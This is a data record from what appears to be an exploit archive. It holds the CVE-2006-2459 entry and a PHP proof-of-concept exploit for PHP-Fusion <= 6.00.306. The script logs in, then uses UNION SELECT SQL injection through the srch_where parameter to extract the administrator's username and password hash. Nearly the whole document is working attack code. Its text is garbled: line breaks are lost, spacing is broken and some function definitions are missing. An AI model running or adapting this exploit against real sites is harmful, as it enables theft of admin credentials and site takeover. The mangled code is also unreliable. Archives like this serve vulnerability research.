{
    "text": "vul_name : PHP-Fusion <= 6.00.306 \"srch_where\" SQL injection / admin credentials disclosure ， vul_cve : CVE-2006-2459 ， vul_poc :  #  ! /usr/bin/php -q -d short_open_tag=on ， <? ， echo \"PHP-Fusion <= v6.00.306 \"srch_where\" SQL Injection/Admin credentials disclosurern\" ;  ， echo \"by rgod rgod ( at ) autistici ( dot ) org [ email concealed ] rn\" ;  ， echo \"site :  ， echo \"Usage : php \". $ argv [ 0 ] .\" host path user pass OPTIONSrn\" ;  ， echo \"host : target server ( ip/hostname ) rn\" ;  ， echo \"path : path to PHP-Fusionrn\" ;  ， echo \"user/pass : you need an accountrn\" ;  ， echo \"Options : rn\" ;  ， echo \" -p [ port ]  : specify a port other than 80rn\" ;  ， echo \" -P [ ip : port ]  : specify a proxyrn\" ;  ， echo \"Example : rn\" ;  ， echo \"php \". $ argv [ 0 ] .\" localhost /fusion/ username passwordrn\" ;  ， die ;  ， } ， error_reporting ( 0 )  ;  ， ini_set ( \"max_execution_time\" , 0 )  ;  ， ini_set ( \"default_socket_timeout\" , 5 )  ;  ， { ，  $ result=' ;  $ exa=' ;  $ cont=0 ;  ， { ， { $ result.=\" .\" ; } ， { $ result.=\" \". $ string [  $ i ]  ; } ， { $ exa.=\" \".dechex ( ord (  $ string [  $ i ]  )  ; } ， { $ exa.=\" 0\".dechex ( ord (  $ string [  $ i ]  )  ; } ，  $ cont+ ; if (  $ cont=15 ) { $ cont=0 ;  $ result.=\"rn\" ;  $ exa.=\"rn\" ; } ， } ， } ，  $ proxy_regex = ' ( bd{1 , 3}.d{1 , 3}.d{1 , 3}.d{1 , 3} : d{1 , 5}b ) ' ;  ， { ， global $ proxy ,  $ host ,  $ port ,  $ html ,  $ proxy_regex ;  ，  $ ock=fsockopen ( gethostbyname (  $ host )  ,  $ port )  ;  ， echo 'No response from '. $ host.' : '. $ port ; die ;  ， } ， } ，  $ c = preg_match (  $ proxy_regex ,  $ proxy )  ;  ， echo 'Not a valid proxy.' ; die ;  ， } ，  $ parts=explode ( ' : ' ,  $ proxy )  ;  ， echo \"Connecting to \". $ parts [ 0 ] .\" : \". $ parts [ 1 ] .\" proxy.rn\" ;  ，  $ ock=fsockopen (  $ parts [ 0 ]  ,  $ parts [ 1 ]  )  ;  ， echo 'No response from proxy.' ; die ;  ， } ， } ， fputs (  $ ock ,  $ packet )  ;  ，  $ html=' ;  ，  $ html.=fgets (  $ ock )  ;  ， } ， } ，  $ html=' ;  ，  $ html.=fread (  $ ock , 1 )  ;  ， } ， } ， fclose (  $ ock )  ;  ，  # debug ，  # echo \"rn\". $ html ;  ， } ，  $ host= $ argv [ 1 ]  ;  ，  $ path= $ argv [ 2 ]  ;  ，  $ user= $ argv [ 3 ]  ;  ，  $ pass= $ argv [ 4 ]  ;  ，  $ port=80 ;  ，  $ proxy=\" ;  ，  $ temp= $ argv [  $ i ]  [ 0 ] . $ argv [  $ i ]  [ 1 ]  ;  ， { ，  $ port=str_replace ( \"-p\" , \" ,  $ argv [  $ i ]  )  ;  ， } ， { ，  $ proxy=str_replace ( \"-P\" , \" ,  $ argv [  $ i ]  )  ;  ， } ， } ， echo \"step 1 -> login.rn\" ;  ，  $ data =\"user_name=\".urlencode ( trim (  $ user )  ;  ，  $ data.=\"&user_pass=\".urlencode ( trim (  $ pass )  ;  ，  $ data.=\"&login=Login\" ;  ，  $ packet=\"POST \". $ p.\"news.php HTTP/1.0rn\" ;  ，  $ packet.=\"Accept : image/gif , image/x-xbitmap , image/jpeg , image/pjpeg , application/x-shockwave-flash , application/msword ,  * / * rn\" ;  ，  $ packet.=\"Referer :  ，  $ packet.=\"Accept-Language : enrn\" ;  ，  $ packet.=\"Content-Type : application/x-www-form-urlencodedrn\" ;  ，  $ packet.=\"Accept-Encoding : gzip , deflatern\" ;  ，  $ packet.=\"Host : \". $ host.\"rn\" ;  ，  $ packet.=\"Content-Length : \".strlen (  $ data ) .\"rn\" ;  ，  $ packet.=\"Connection : Keep-Alivern\" ;  ，  $ packet.=\"Cache-Control : no-cachern\" ;  ，  $ packet.=\"Cookie : fusion_visited=yes ; PHPSESSID=44ab49664b56b97036425427b1ffb8cfrnrn\" ;  ，  $ packet.= $ data ;  ， sendpacketii (  $ packet )  ;  ，  $ temp=explode ( \"Set-Cookie : \" ,  $ html )  ;  ，  $ temp2=explode ( ' ' ,  $ temp [ 1 ]  )  ;  ，  $ cookie= $ temp2 [ 0 ]  ;  ， echo 'Your cookie -> '. $ cookie.\"rnrn\" ;  ， echo \"step 2 -> inject some code in srch_where argument.rn\" ;  ，  $ sql=\"999999 UNION SELECT 0 , 0 , 0 , user_name , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 ,  ， 0 FROM fusion_users WHERE user_level=103/ * \" ;  ，  $ sql=urlencode (  $ sql )  ;  ，  $ packet =\"GET \". $ p.\"messages.php?folder=inbox&show=_&srch_where=\". $ sql.\" HTTP/1.0rn\" ;  ，  $ packet.=\"Host : \". $ host.\"rn\" ;  ，  $ packet.=\"Cookie : \". $ cookie.\"rn\" ;  ，  $ packet.=\"Connection : Closernrn\" ;  ， sendpacketii (  $ packet )  ;  ，  $ temp=explode ( \"messages.php?msg_view=\" ,  $ html )  ;  ，  $ temp2=explode ( \">\" ,  $ temp [ 1 ]  )  ;  ，  $ temp=explode ( \"<\" ,  $ temp2 [ 1 ]  )  ;  ，  $ admin= $ temp [ 0 ]  ;  ， echo \"admin : \". $ admin.\"rn\" ;  ，  $ sql=\"999999 UNION SELECT 0 , 0 , 0 , user_password , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 ,  ， 0 , 0 , 0 FROM fusion_users WHERE user_level=103/ * \" ;  ，  $ sql=urlencode (  $ sql )  ;  ，  $ packet =\"GET \". $ p.\"messages.php?folder=inbox&show=_&srch_where=\". $ sql.\" HTTP/1.0rn\" ;  ，  $ packet.=\"Host : \". $ host.\"rn\" ;  ，  $ packet.=\"Cookie : \". $ cookie.\"rn\" ;  ，  $ packet.=\"Connection : Closernrn\" ;  ， sendpacketii (  $ packet )  ;  ，  $ temp=explode ( \"messages.php?msg_view=\" ,  $ html )  ;  ，  $ temp2=explode ( \">\" ,  $ temp [ 1 ]  )  ;  ，  $ temp=explode ( \"<\" ,  $ temp2 [ 1 ]  )  ;  ，  $ hash= $ temp [ 0 ]  ;  ， echo \"hash : \". $ hash.\"rn\" ;  ， ?> ， original url : ",
    "time": "2006.05.21"
}